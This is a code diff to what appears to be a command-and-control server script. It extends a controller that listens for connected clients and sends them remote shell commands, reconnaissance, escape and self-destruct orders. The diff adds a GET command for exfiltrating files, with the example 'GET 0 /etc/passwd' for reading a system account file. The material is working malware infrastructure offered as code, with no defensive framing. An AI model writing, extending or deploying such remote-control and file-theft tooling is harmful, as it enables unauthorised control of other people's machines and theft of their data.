@@ -7,7 +7,7 @@ import threading
 host = '0.0.0.0'  # Open to anyone on the same wifi
 port = 8888
 
-types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON', 'IP_REPORT', 'ESCAPE', 'SELF_DESTRUCT']
+types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON', 'IP_REPORT', 'ESCAPE', 'SELF_DESTRUCT', 'GET']
 
 lock = threading.Lock()
 addresses = []
@@ -27,12 +27,13 @@ def list_connections():
 def show_help():
     print("Usage: <command> <connection_id> [params...]")
     print("Server commands (no ID): 'help', 'listconns'")
-    print("Client commands: HELO, EXIT, CMD <cmd>, RECON, IP_REPORT, ESCAPE, SELF_DESTRUCT")
+    print("Client commands: HELO, EXIT, CMD <cmd>, RECON, IP_REPORT, ESCAPE, SELF_DESTRUCT, GET")
     print("Examples: HELO 0")
     print("          RECON 0")
     print("          ESCAPE 0")
     print("          IP_REPORT 0")
     print("          CMD 0 ls")
+    print("          GET 0 /etc/passwd")
     print("          SELF_DESTRUCT 0")
 
 # ----------------------------------------------------------------------
@@ -85,10 +86,10 @@ def parseAndSendInput():
             msg_id = str(random.randint(0, 10**9))
             data = " ".join(user_input[2:]) if len(user_input) > 2 else ""
 
-            if msg_type in ['READ', 'RITE', 'CMD'] and not data:
+            if msg_type in ['READ', 'RITE', 'CMD', 'GET'] and not data:
                 print(f"{msg_type} requires additional arguments")
                 continue
-            if msg_type not in ['READ', 'RITE', 'CMD'] and data:
+            if msg_type not in ['READ', 'RITE', 'CMD', 'GET'] and data:
                 print(f"{msg_type} should not have arguments")
                 continue
 
